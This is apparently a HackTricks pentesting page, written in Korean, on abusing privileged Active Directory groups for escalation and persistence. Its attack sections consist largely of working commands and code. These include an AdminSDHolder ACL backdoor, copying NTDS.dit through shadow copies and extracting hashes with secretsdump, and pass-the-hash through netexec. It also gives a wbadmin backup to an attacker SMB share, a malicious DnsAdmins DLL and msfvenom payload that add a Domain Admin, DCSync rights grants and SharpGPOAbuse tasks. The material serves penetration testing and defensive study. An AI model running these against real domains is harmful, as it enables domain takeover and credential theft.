# 권한 있는 그룹

{{#include ../../banners/hacktricks-training.md}}

## 관리 권한이 있는 잘 알려진 그룹

- **Administrators**
- **Domain Admins**
- **Enterprise Admins**

## Account Operators

이 그룹은 도메인에서 관리자가 아닌 계정과 그룹을 생성할 수 있는 권한을 부여받습니다. 또한 Domain Controller (DC)에 로컬 로그인을 허용합니다.

이 그룹의 구성원을 식별하려면 다음 명령을 실행합니다:

```bash
Get-NetGroupMember -Identity "Account Operators" -Recurse
```

새 사용자를 추가할 수 있으며, DC에 로컬 로그인할 수도 있습니다.<sup>[[1]](#references)</sup>

계정 관리에서 로컬 관리자 액세스로 이어질 수 있는 조건부 경로는 **컴퓨터의 LAPS 암호를 읽도록 위임된 일반 그룹**입니다. 해당 그룹에 대한 유효한 멤버십 쓰기 권한이 있는지, 보호된 그룹인지, 새 계정이나 제어 중인 계정이 실제로 그룹에 가입할 수 있는지 확인하세요. 대상 컴퓨터의 LAPS 읽기 권한을 테스트하기 전에 계정의 토큰을 새로 고치세요. 암호화된 Windows LAPS에서는 디렉터리 읽기 권한과 암호 복호화 권한이 별개의 요건입니다. 그룹 멤버십이나 Account Operators 멤버십만으로는 어느 쪽도 보장되지 않습니다. [Microsoft의 Account Operators 범위](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups) 및 [Windows LAPS 위임](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-scenarios-windows-server-active-directory)을 참조하세요.

## AdminSDHolder 그룹

**AdminSDHolder** 그룹의 Access Control List (ACL)는 Active Directory 내 모든 "보호된 그룹"의 권한을 설정하므로 매우 중요합니다. 이 메커니즘은 무단 수정을 방지하여 해당 그룹의 보안을 보장합니다.

공격자는 **AdminSDHolder** 그룹의 ACL을 수정해 일반 사용자에게 모든 권한을 부여하는 방식으로 이를 악용할 수 있습니다. 이렇게 하면 해당 사용자가 모든 보호된 그룹을 완전히 제어할 수 있게 됩니다. 이 사용자의 권한이 변경되거나 제거되더라도 시스템 설계에 따라 한 시간 이내에 자동으로 복구됩니다.<sup>[[14]](#references)</sup>

최신 Windows Server 문서에서도 여러 기본 제공 운영자 그룹을 **보호된** 개체로 취급합니다(`Account Operators`, `Backup Operators`, `Print Operators`, `Server Operators`, `Domain Admins`, `Enterprise Admins`, `Key Admins`, `Enterprise Key Admins` 등). 기본적으로 **SDProp** 프로세스는 60분마다 **PDC Emulator**에서 실행되어 `adminCount=1`을 설정하고 보호된 개체의 상속을 비활성화합니다. 이는 지속성을 확보하는 데 유용하며, 보호된 그룹에서 제거됐지만 상속되지 않는 ACL이 여전히 남아 있는 권한이 오래된 사용자를 찾아내는 데도 유용합니다.<sup>[[12]](#references)</sup>

멤버를 검토하고 권한을 수정하는 명령은 다음과 같습니다.

```bash
Get-NetGroupMember -Identity "AdminSDHolder" -Recurse
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -PrincipalIdentity matt -Rights All
Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs | ?{$_.IdentityReference -match 'spotless'}
```

```powershell
# Hunt users/groups that still have adminCount=1
Get-ADObject -LDAPFilter '(adminCount=1)' -Properties adminCount,distinguishedName |
  Select-Object distinguishedName
```

복원 프로세스를 신속히 진행하는 데 사용할 수 있는 스크립트가 있습니다: [Invoke-ADSDPropagation.ps1](https://github.com/edemilliere/ADSI/blob/master/Invoke-ADSDPropagation.ps1).

자세한 내용은 [ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence)을 참조하세요.<sup>[[14]](#references)</sup>

## AD 휴지통

삭제된 개체를 볼 수 있는지는 유효한 디렉터리 권한으로 결정됩니다. 그룹 이름만으로는 현재 ID가 개체를 나열하거나 복원할 수 있음을 입증하지 못합니다. 완전히 복원하려면 삭제 전에 AD Recycle Bin이 활성화되어 있어야 하며, 복원에는 naming-context 루트에 대한 Reanimate-Tombstones 권한, 이름 변경 권한, 대상 컨테이너에 대한 CREATE_CHILD 권한도 필요합니다. [Microsoft의 Recycle Bin 안내](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/get-started/adac/active-directory-recycle-bin)와 [삭제 취소 권한 규칙](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/c7279698-8aed-4e0b-b750-97c29f11b004)은 이러한 조건을 구분합니다. 삭제된 개체를 읽을 권한이 있는 ID는 민감한 정보가 노출될 수 있는 레코드를 확인할 수 있습니다:

```bash
Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
```

이는 **이전 권한 경로를 복구하는 데** 유용합니다. 삭제된 객체에도 `lastKnownParent`, `memberOf`, `sIDHistory`, `adminCount`, 이전 SPN 또는 삭제된 권한 그룹의 DN이 남아 있을 수 있으며, 이후 다른 운영자가 해당 그룹을 복원할 수도 있습니다.

객체가 삭제된 상태로 남아 있는 동안 애플리케이션에서 정의한 속성에 이전 credential 자료가 보존될 수도 있습니다. 이를 별도의 검토 단서로 다루세요. 현재 identity에 삭제된 객체를 열거하고 해당 속성을 읽을 권한이 모두 있어야 하며, 값이 실제로 사용할 수 있는 credential이어야 하고, 여전히 활성 상태인 principal이 이를 받아들여야 합니다. 그룹 멤버십이나 삭제된 계정 이름만으로는 이 중 어느 것도 입증되지 않습니다. 일반적인 열거 과정에서 credential 값을 출력하지 마세요. [Microsoft의 Recycle Bin documentation](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/get-started/adac/active-directory-recycle-bin)에서는 삭제 후 속성 보존에 대해 설명합니다.

```powershell
Get-ADObject -Filter 'isDeleted -eq $true' -IncludeDeletedObjects `
  -Properties samAccountName,lastKnownParent,memberOf,sIDHistory,adminCount,servicePrincipalName |
  Select-Object samAccountName,lastKnownParent,adminCount,sIDHistory,servicePrincipalName
```

### Domain Controller 액세스

사용자가 `Server Operators` 그룹에 속하지 않으면 DC의 파일에 대한 액세스가 제한됩니다. 이 그룹에 속하면 액세스 수준이 달라집니다.

### 권한 상승

Sysinternals의 `PsService` 또는 `sc`를 사용하면 서비스 권한을 확인하고 수정할 수 있습니다. 예를 들어 `Server Operators` 그룹은 특정 서비스에 대한 모든 권한을 가지므로 임의의 명령을 실행하고 권한을 상승시킬 수 있습니다:<sup>[[1]](#references)</sup>

```cmd
C:\> .\PsService.exe security AppReadiness
```

이 명령은 `Server Operators`가 모든 권한을 보유해, 서비스를 조작하여 권한을 상승시킬 수 있음을 보여줍니다.

## Backup Operators

`Backup Operators`의 구성원은 호스트의 로컬 정책과 로그온 세션에 따라 `SeBackupPrivilege` 및 `SeRestorePrivilege`를 부여받을 수 있습니다. `whoami /groups` 및 `whoami /priv`를 사용해 **명령을 실행하는 프로세스의 유효 토큰**을 확인하세요. 그룹에 속해 있다는 사실만으로 `SeBackupPrivilege`가 있고 활성화되어 있다고 단정할 수는 없습니다. 권한이 있지만 비활성화된 경우 해당 토큰에서 활성화할 수 있으며, 권한이 없거나 제거된 경우 백업 작업에서 이를 사용할 수 없습니다. `SeBackupPrivilege`는 백업 인식 API(예: `FILE_FLAG_BACKUP_SEMANTICS` 또는 `robocopy /B`)를 통한 보호된 **읽기**를 지원합니다. `SeRestorePrivilege`는 복원/쓰기 작업을 위한 별도의 권한입니다. 일반 디렉터리 목록 조회와 복사 작업이 반드시 백업 semantics를 사용하는 것은 아닙니다.<sup>[[1]](#references)</sup>

그룹 구성원을 나열하려면 다음 명령을 실행합니다:

```bash
Get-NetGroupMember -Identity "Backup Operators" -Recurse
```

### 로컬 공격

유효 토큰에 `SeBackupPrivilege`가 있는 호스트에서는 다음과 같이 백업을 인식하는 복사 작업으로 보호된 파일을 읽을 수 있습니다.

1. 필요한 라이브러리를 가져옵니다:

```bash
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
```

2. 권한이 존재하지만 비활성화되어 있다면, 이 프로세스에서 해당 권한을 활성화하고 상태를 확인합니다:

```bash
Set-SeBackupPrivilege
Get-SeBackupPrivilege
```

3. 제한된 디렉터리에서 파일 복사, 예를 들면:

```bash
dir C:\Users\Administrator\
Copy-FileSeBackupPrivilege C:\Users\Administrator\report.pdf c:\temp\x.pdf -Overwrite
```

### AD 공격

`NTDS.dit`는 **도메인 컨트롤러(DC)**의 Active Directory 데이터베이스입니다. 이 방법을 사용하려면 DC에서 적절한 토큰이 있어야 하며 데이터베이스가 있는 볼륨에 접근할 수 있어야 합니다. 다른 곳에서 Backup Operators 그룹에 속해 있더라도 특정 DC에 대한 접근 권한이 부여되지는 않습니다. 실행 중인 데이터베이스는 일반적으로 잠겨 있으므로 복사하기 전에 접근 가능한 shadow copy나 다른 백업 기능을 사용하세요. Shadow copy를 생성하거나 노출하는 기능도 호스트의 VSS 구성과 호출자의 권한에 따라 달라집니다. 아래 예시는 DC가 `NTDS.dit`를 `C:`의 `\Windows\NTDS`에 저장한다고 가정합니다. 그렇지 않다면 볼륨과 경로를 조정하세요.

#### diskshadow.exe 사용

1. 허용되는 경우 DC의 `C:` 드라이브에 shadow copy를 생성하고 `F:`로 노출합니다:

```cmd
diskshadow.exe
set verbose on
set metadata C:\Windows\Temp\meta.cab
set context clientaccessible
begin backup
add volume C: alias cdrive
create
expose %cdrive% F:
end backup
exit
```

2. shadow copy에서 `NTDS.dit` 복사:

```cmd
mkdir C:\Tools
Copy-FileSeBackupPrivilege F:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
```

또는 파일 복사에 `robocopy`를 사용하세요:

```cmd
robocopy /B F:\Windows\NTDS C:\Tools ntds.dit
```

3. 오프라인 추출을 위해 DC의 `SYSTEM` 하이브를 저장합니다. `SAM`은 멤버 시스템의 로컬 계정 데이터베이스입니다. DC의 `SAM` 하이브는 `NTDS.dit`을 대체할 수 없으며 도메인 Administrator의 hash를 얻는 출처도 아닙니다:

```cmd
reg save HKLM\SYSTEM C:\Tools\SYSTEM.SAV
```

4. `ntds.dit`와 `SYSTEM.SAV`를 분석 호스트로 전송하고 도메인 계정 해시를 추출합니다. 구성원 시스템에서 저장한 `SAM` 하이브와 이에 대응하는 `SYSTEM` 하이브를 사용하면 로컬 계정 해시를 얻을 수 있습니다.

```shell-session
secretsdump.py -ntds ntds.dit -system SYSTEM.SAV LOCAL
```

5. `NTDS.dit`에서 **도메인** Administrator 해시를 복구했다면, 도메인 인증에 사용할 수 있는지 테스트할 수 있습니다. `SAM.SAV`에서 얻은 로컬 Administrator 해시는 별도의 자격 증명이므로 도메인 Administrator로 인증되지 않습니다.<sup>[[11]](#references)</sup>

```bash
# Use the recovered domain Administrator NT hash to authenticate without the cleartext password
netexec winrm <DC_FQDN> -d <DOMAIN> -u Administrator -H <ADMIN_NT_HASH> -x "whoami"

# Or execute via SMB using an exec method
netexec smb <DC_FQDN> -d <DOMAIN> -u Administrator -H <ADMIN_NT_HASH> --exec-method smbexec -x cmd
```

#### wbadmin.exe 사용

1. 공격자 머신에 SMB 서버용 NTFS 파일 시스템을 설정하고 대상 머신에 SMB 자격 증명을 캐시합니다.
2. 시스템 백업 및 `NTDS.dit` 추출에 `wbadmin.exe`를 사용합니다.
   ```cmd
   net use X: \\<AttackIP>\sharename /user:smbuser password
   echo "Y" | wbadmin start backup -backuptarget:\\<AttackIP>\sharename -include:c:\windows\ntds
   wbadmin get versions
   echo "Y" | wbadmin start recovery -version:<date-time> -itemtype:file -items:c:\windows\ntds\ntds.dit -recoverytarget:C:\ -notrestoreacl
   ```

실제 시연은 [DEMO VIDEO WITH IPPSEC](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610s)을 참고하세요.

## DnsAdmins

**DnsAdmins** 그룹의 구성원은 권한을 악용해 DNS 서버에서 SYSTEM 권한으로 임의의 DLL을 로드할 수 있습니다. DNS 서버는 도메인 컨트롤러에서 호스팅되는 경우가 많습니다. 이 기능은 상당한 악용 가능성을 제공합니다.

DnsAdmins 그룹의 구성원을 나열하려면 다음을 사용하세요:

```bash
Get-NetGroupMember -Identity "DnsAdmins" -Recurse
```

### 임의의 DLL 실행 (CVE‑2021‑40469)

> [!NOTE]
> 이 취약점을 악용하면 DNS 서비스(대개 DC 내부)에서 SYSTEM 권한으로 임의의 코드를 실행할 수 있습니다. 이 문제는 2021년에 수정되었습니다.

구성원은 다음과 같은 명령을 사용해 DNS 서버가 임의의 DLL(로컬 또는 원격 공유에서)을 로드하도록 할 수 있습니다:

```bash
dnscmd [dc.computername] /config /serverlevelplugindll c:\path\to\DNSAdmin-DLL.dll
dnscmd [dc.computername] /config /serverlevelplugindll \\1.2.3.4\share\DNSAdmin-DLL.dll
An attacker could modify the DLL to add a user to the Domain Admins group or execute other commands with SYSTEM privileges. Example DLL modification and msfvenom usage:

# If dnscmd is not installed run from aprivileged PowerShell session:
Install-WindowsFeature -Name RSAT-DNS-Server -IncludeManagementTools
```

```c
// Modify DLL to add user
DWORD WINAPI DnsPluginInitialize(PVOID pDnsAllocateFunction, PVOID pDnsFreeFunction)
{
    system("C:\\Windows\\System32\\net.exe user Hacker T0T4llyrAndOm... /add /domain");
    system("C:\\Windows\\System32\\net.exe group \"Domain Admins\" Hacker /add /domain");
}
```

```bash
// Generate DLL with msfvenom
msfvenom -p windows/x64/exec cmd='net group "domain admins" <username> /add /domain' -f dll -o adduser.dll
```

DLL을 로드하려면 DNS 서비스를 다시 시작해야 합니다(추가 권한이 필요할 수 있음):

```csharp
sc.exe \\dc01 stop dns
sc.exe \\dc01 start dns
```

이 attack vector에 대한 자세한 내용은 ired.team을 참조하세요.

#### Mimilib.dll

mimilib.dll을 사용해 command execution을 수행하는 것도 가능합니다. 특정 명령이나 reverse shell을 실행하도록 수정하면 됩니다. 자세한 내용은 [이 게시물](https://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html)을 참조하세요.<sup>[[15]](#references)</sup>

### MitM을 위한 WPAD 레코드

DnsAdmins는 global query block list를 비활성화한 후 WPAD 레코드를 생성해 DNS 레코드를 조작하고 Man-in-the-Middle (MitM) 공격을 수행할 수 있습니다. Responder나 Inveigh 같은 도구를 사용해 네트워크 트래픽을 spoofing하고 캡처할 수 있습니다.

### Event Log Readers
구성원은 이벤트 로그에 접근하여 평문 비밀번호나 명령 실행 정보 같은 민감한 정보를 찾을 수 있습니다:

```bash
# Get members and search logs for sensitive information
Get-NetGroupMember -Identity "Event Log Readers" -Recurse
Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'}
```

## Exchange Windows Permissions

이 그룹은 도메인 객체의 DACL을 수정할 수 있어 DCSync 권한을 부여할 가능성이 있습니다. 이 그룹을 악용한 권한 상승 기법은 Exchange-AD-Privesc GitHub repo에 자세히 설명되어 있습니다.

```bash
# List members
Get-NetGroupMember -Identity "Exchange Windows Permissions" -Recurse
```

이 그룹의 구성원으로 활동할 수 있다면, 전형적인 악용 방법은 공격자가 제어하는 principal에 [DCSync](dcsync.md)에 필요한 복제 권한을 부여하는 것입니다:

```bash
Add-DomainObjectAcl -TargetIdentity "DC=testlab,DC=local" -PrincipalIdentity attacker -Rights DCSync
Get-ObjectAcl -DistinguishedName "DC=testlab,DC=local" -ResolveGUIDs | ?{$_.IdentityReference -match 'attacker'}
```

Historically, **PrivExchange**는 mailbox access, 강제된 Exchange authentication, LDAP relay를 연결해 동일한 권한을 확보했습니다. 해당 relay 경로가 완화된 경우에도 `Exchange Windows Permissions`에 직접 속해 있거나 Exchange server를 제어할 수 있다면 여전히 domain replication 권한을 얻을 수 있는 고가치 경로입니다.

## Hyper-V Administrators

Hyper-V Administrators는 Hyper-V에 대한 전체 액세스 권한을 가지며, 이를 악용해 가상화된 Domain Controller를 장악할 수 있습니다. 여기에는 실행 중인 DC를 복제하고 NTDS.dit 파일에서 NTLM hashes를 추출하는 것도 포함됩니다.

### 악용 예시

실제 악용은 대개 오래된 host-level LPE 기법이 아니라 **DC 디스크/checkpoint에 대한 오프라인 액세스**를 이용합니다. Hyper-V host에 액세스할 수 있다면, 공격자는 가상화된 Domain Controller의 checkpoint를 생성하거나 내보내고 VHDX를 마운트해 게스트 내부의 LSASS를 건드리지 않고 `NTDS.dit`, `SYSTEM` 및 기타 secrets를 추출할 수 있습니다:

```bash
# Host-side enumeration
Get-VM
Get-VHD -VMId <vm-guid>

# After exporting or checkpointing the DC, mount the disk read-only
Mount-VHD -Path 'C:\HyperV\Virtual Hard Disks\DC01.vhdx' -ReadOnly
```

그런 다음 `Backup Operators` workflow를 재사용해 `Windows\NTDS\ntds.dit`와 레지스트리 하이브를 오프라인으로 복사합니다. 관련 백업 파일 workflow:

{{#ref}}
../../network-services-pentesting/pentesting-veeam-backup-and-replication.md
{{#endref}}

## Group Policy Creators Owners	

이 그룹의 구성원은 도메인에서 Group Policy를 만들 수 있습니다. 하지만 구성원은 사용자나 그룹에 Group Policy를 적용하거나 기존 GPO를 편집할 수 없습니다.

중요한 점은 **새 GPO를 만든 사람이 해당 GPO의 소유자가 되며**, 보통 이후 이를 편집할 수 있는 충분한 권한도 얻는다는 것입니다. 따라서 다음과 같은 경우 이 그룹이 유용할 수 있습니다.

- 악성 GPO를 만들고 관리자에게 이를 대상 OU/도메인에 연결하도록 설득할 수 있는 경우
- 자신이 만든 GPO가 이미 유용한 위치에 연결되어 있고 이를 편집할 수 있는 경우
- GPO를 연결할 수 있는 다른 위임 권한을 악용하면서, 이 그룹으로 편집 권한을 얻는 경우

실질적인 악용은 보통 SYSVOL에 저장된 정책 파일을 통해 **Immediate Task**, **startup script**, **local admin membership** 또는 **user rights assignment**를 변경하는 방식으로 이루어집니다.<sup>[[3]](#references)[[4]](#references)[[13]](#references)[[16]](#references)</sup>

```bash
# Example with SharpGPOAbuse: add an immediate task that executes as SYSTEM
SharpGPOAbuse.exe --AddImmediateTask --TaskName "HT-Task" --Author TESTLAB\\Administrator --Command "cmd.exe" --Arguments "/c whoami > C:\\Windows\\Temp\\gpo.txt" --GPOName "Security Update"
```

GPO를 `SYSVOL`을 통해 수동으로 편집하는 경우, 변경만으로는 충분하지 않다는 점을 기억하세요. `versionNumber`, `GPT.ini`, 때로는 `gPCMachineExtensionNames`도 업데이트해야 합니다. 그렇지 않으면 클라이언트가 정책 새로 고침을 무시합니다.<sup>[[9]](#references)</sup>

## Organization Management

**Microsoft Exchange**가 배포된 환경에서는 **Organization Management**라는 특수 그룹이 상당한 권한을 보유합니다. 이 그룹은 **모든 도메인 사용자의 사서함에 액세스**할 수 있는 권한을 가지며, **'Microsoft Exchange Security Groups'** OU(조직 구성 단위)를 **완전히 제어**합니다. 여기에는 권한 상승에 악용될 수 있는 **`Exchange Windows Permissions`** 그룹도 포함됩니다.

### 권한 악용 및 명령어

#### Print Operators

**Print Operators** 그룹의 구성원은 **`SeLoadDriverPrivilege`**를 비롯한 여러 권한을 가집니다. 이 권한으로 **도메인 컨트롤러에 로컬로 로그온**하고, 도메인 컨트롤러를 종료하며, 프린터를 관리할 수 있습니다. 이러한 권한을 악용하려면, 특히 권한이 상승되지 않은 컨텍스트에서 **`SeLoadDriverPrivilege`**가 보이지 않는 경우 UAC(사용자 계정 컨트롤)를 우회해야 합니다.<sup>[[1]](#references)</sup>

이 그룹의 구성원을 나열하려면 다음 PowerShell 명령어를 사용합니다:

```bash
Get-NetGroupMember -Identity "Print Operators" -Recurse
```

도메인 컨트롤러에서 이 그룹은 위험합니다. 기본 Domain Controller Policy가 **`SeLoadDriverPrivilege`**를 `Print Operators`에 부여하기 때문입니다. 이 그룹 구성원의 elevated token을 얻으면 해당 권한을 활성화하고 서명되었지만 취약한 드라이버를 로드해 커널/SYSTEM 권한으로 상승할 수 있습니다.<sup>[[2]](#references)[[5]](#references)[[6]](#references)[[7]](#references)[[8]](#references)[[10]](#references)[[17]](#references)</sup> 토큰 처리에 관한 자세한 내용은 [Access Tokens](../windows-local-privilege-escalation/access-tokens.md)를 확인하세요.

#### Remote Desktop Users

이 그룹의 구성원은 Remote Desktop Protocol (RDP)을 통해 PC에 접속할 수 있습니다. PowerShell 명령으로 구성원을 열거할 수 있습니다:

```bash
Get-NetGroupMember -Identity "Remote Desktop Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Desktop Users"
```

RDP 악용에 대한 추가 정보는 전용 pentesting 리소스에서 확인할 수 있습니다.

#### Remote Management Users

이 그룹의 구성원은 **Windows Remote Management (WinRM)**을 통해 PC에 액세스할 수 있습니다. 다음을 통해 구성원을 열거할 수 있습니다:

```bash
Get-NetGroupMember -Identity "Remote Management Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Management Users"
```

WinRM과 관련된 exploitation techniques에 대해서는 특정 문서를 참고해야 합니다.

#### Server Operators

이 그룹은 백업 및 복원 권한, 시스템 시간 변경, 시스템 종료를 포함하여 Domain Controllers에서 다양한 설정을 수행할 권한이 있습니다.<sup>[[1]](#references)</sup> 구성원을 열거하려면 다음 명령을 사용합니다:

```bash
Get-NetGroupMember -Identity "Server Operators" -Recurse
```

도메인 컨트롤러에서 `Server Operators`는 일반적으로 **서비스를 재구성하거나 시작/중지할 수 있는** 충분한 권한을 상속하며, 기본 DC 정책을 통해 `SeBackupPrivilege`/`SeRestorePrivilege`도 부여받습니다. 실제로 이들은 **서비스 제어 악용**과 **NTDS 추출**을 연결하는 다리 역할을 합니다:

```cmd
sc.exe \\dc01 query
sc.exe \\dc01 qc <service>
.\PsService.exe security <service>
```

일반 서비스 목록을 조회할 수 없다고 해서 **알려진 서비스**에 접근할 수 없는 것은 아닙니다. Service Control Manager는 서비스 목록 조회 시 `SC_MANAGER_ENUMERATE_SERVICE` 권한을 확인하고, `SC_MANAGER_CONNECT` 권한은 별도로 확인합니다. 이름이 지정된 서비스를 열 때는 해당 서비스의 자체 권한을 확인하며, 여기에는 `SERVICE_CHANGE_CONFIG`와 `SERVICE_START`가 포함됩니다. 일반 `sc.exe query`가 실패하더라도 유효 토큰과 해당 서비스의 ACL을 확인하세요. 구성 변경 권한만으로는 가능성이 있다는 것뿐입니다. 더 높은 권한으로 전환할 수 있는지는 서비스 계정, 시작/중지 권한, 그리고 사용할 수 있는 트리거에 따라 달라집니다. [Microsoft의 서비스 액세스 권한 참조](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights)를 참고하세요.

서비스 ACL에서 이 그룹에 변경/시작 권한을 허용한다면, 서비스를 임의의 명령으로 지정하고 `LocalSystem`으로 시작한 다음 원래 `binPath`를 복원하세요. 서비스 제어가 제한되어 있다면, 위의 `Backup Operators` 기법을 사용해 `NTDS.dit`를 복사하세요.

## References

- [1] [ired.team – 권한 계정 및 토큰 권한](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [2] [Tarlogic – 권한 상승을 위한 SeLoadDriverPrivilege 악용](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/)
- [3] [harmj0y – GPO 권한 악용](https://blog.harmj0y.net/redteaming/abusing-gpo-permissions/)
- [4] [rastamouse – GPO 악용, 1부 (Internet Archive)](https://web.archive.org/web/20190416075109/https://rastamouse.me/2019/01/gpo-abuse-part-1/)
- [5] [killswitch-GUI – HotLoad-Driver (ntloaddriver.cpp)](https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/EXE/NtLoadDriver-C%2B%2B/ntloaddriver.cpp#L13)
- [6] [tandasat – ExploitCapcom](https://github.com/tandasat/ExploitCapcom)
- [7] [TarlogicSecurity – EoPLoadDriver (eoploaddriver.cpp)](https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp)
- [8] [FuzzySecurity – Capcom-Rootkit (Capcom.sys)](https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys)
- [9] [SpecterOps – GPO 및 OU에 대한 레드팀 가이드](https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e)
- [10] [Microsoft Learn – ZwLoadDriver 함수](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-zwloaddriver)
- [11] [HTB: Baby — 익명 LDAP → Password Spray → SeBackupPrivilege → Domain Admin](https://0xdf.gitlab.io/2025/09/19/htb-baby.html)
- [12] [Microsoft Learn – 부록 C: Active Directory의 보호된 계정 및 그룹](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-c--protected-accounts-and-groups-in-active-directory)
- [13] [WithSecure Labs – SharpGPOAbuse](https://labs.withsecure.com/tools/sharpgpoabuse)
- [14] [ired.team – 도메인 관리자 지속성을 위한 AdminSDHolder 악용 및 백도어 설정 방법](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence)
- [15] [Lab of a Penetration Tester – Active Directory에서 권한 상승을 위한 DnsAdmins 권한 악용](https://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html)
- [16] [BloodHound – GenericAll 엣지 악용 정보](https://bloodhound.specterops.io/resources/edges/generic-all)
- [17] [Undocumented NT Internals – NtLoadDriver 함수 (Internet Archive)](https://web.archive.org/web/20200313000124/http://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html)
{{#include ../../banners/hacktricks-training.md}}
